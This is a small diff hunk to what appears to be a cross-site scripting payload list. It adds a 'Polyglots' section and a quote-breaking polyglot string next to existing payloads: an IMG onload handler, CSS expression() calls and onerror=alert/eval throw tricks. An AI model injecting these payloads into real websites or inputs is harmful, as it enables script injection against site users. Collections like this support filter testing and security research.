@@ -31,8 +31,12 @@ double encoded <TEST WITH PROXY>
 // browser output
 <IMG alt=``onload=xss() src="test.jpg">
 
+
+Polyglots 
 <~/XSS/*-*/STYLE=xss:e/**/xpression(alert(6))>
 <%tag style="xss:expression(alert(6))">
+
+<s>000'")};--//
 
 onerror=alert;throw 1;
 onerror=eval;throw'=alert\x281\x29';
